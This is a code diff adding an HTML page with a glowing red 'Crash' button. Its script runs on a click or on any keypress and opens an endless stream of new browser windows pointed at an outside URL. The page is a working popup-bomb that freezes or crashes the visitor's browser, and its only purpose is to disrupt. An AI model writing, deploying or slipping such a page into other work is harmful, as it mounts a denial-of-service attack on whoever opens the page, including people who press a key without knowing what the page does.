@@ -1,0 +1,54 @@
+<body onkeypress="crash()">
+    <title>Crash</title>
+    <style>
+        body {
+            background-color: black;
+        }
+        button {
+            font-size: 80pt;
+            color: red;
+            background-color: black;
+            border: 2px solid red;
+            cursor: pointer;
+            text-align: center;
+            font-family: monospace;
+            display: flexbox;
+            align-items: center;
+            align-self: center;
+            box-shadow: 0px 0px 20px 0px rgba(255,0,0,1);
+            -webkit-box-shadow: 0px 0px 20px 0px rgba(255,0,0,1);
+            -moz-box-shadow: 0px 0px 20px 0px rgba(255,0,0,1);
+            text-shadow: 0px 0px 5px rgba(255,0,0,1);
+            transition: 1s;
+            border-radius: 10px;
+            vertical-align: middle;
+            position: fixed;
+            top: 40%;
+            padding: 10px;
+        }
+        button:hover {
+            text-shadow: 0px 0px 15px rgba(255,0,0,1);
+            box-shadow: 0px 0px 40px 0px rgba(255,0,0,1);
+            -webkit-box-shadow: 0px 0px 40px 0px rgba(255,0,0,1);
+            -moz-box-shadow: 0px 0px 40px 0px rgba(255,0,0,1);
+            transform: scale(110%);
+            border: 2px solid red;
+        }
+        .parent {
+            display: flex;
+            align-items: center center;
+            align-content: center center;
+            place-content: center center;
+            vertical-align: middle;
+        }
+    </style>
+    <div class="parent"><button onclick="crash()" onkeypress="crash()">Crash</button></div>
+    <script>
+        function crash() {
+            var i = 0;
+            while(i < 18446744073709551616) { //18446744073709551616 = 2^64
+                win = window.open('https://agentseed.org/crash', '', 'width=1000,height=1000');
+                i++
+            }
+        }
+    </script>
